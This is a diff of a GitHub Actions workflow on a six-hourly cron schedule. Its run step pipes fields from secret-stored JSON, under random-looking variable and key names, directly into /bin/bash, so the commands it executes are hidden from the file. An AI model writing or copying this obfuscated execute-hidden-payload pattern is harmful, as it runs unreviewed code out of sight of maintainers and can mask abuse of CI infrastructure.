@@ -2,24 +2,18 @@ name: kezhenchou1268
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 4/6 * * *'
-
-jobs:  # 4125
+    - cron: '30 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: kezhenchou1268
         env:
-          gsm41956: ${{ secrets.gsm41956 }}
+          kggx4: ${{ secrets.kggx4 }}
         run: |
-          echo $gsm41956 | jq -r .vn95346 | /bin/bash
-          echo $s52 | jq -r .snmra9 | /bin/bash
-          echo $xuth60 | jq -r .fxokl76 | /bin/bash
-          echo $byqw40 | jq -r .dd56 | /bin/bash
-          echo $c1 | jq -r .etpwa9 | /bin/bash
-          echo $odvx04343 | jq -r .tp599 | /bin/bash
-          echo $iv87952 | jq -r .w0 | /bin/bash
-          echo $gm8140 | jq -r .b1 | /bin/bash
-          echo $gxq69 | jq -r .xizhd05 | /bin/bash
+          echo $kggx4 | jq -r .uwqrl48 | /bin/bash
+          echo $xk9 | jq -r .cg1 | /bin/bash
+          echo $dh2843 | jq -r .ybq9 | /bin/bash
 
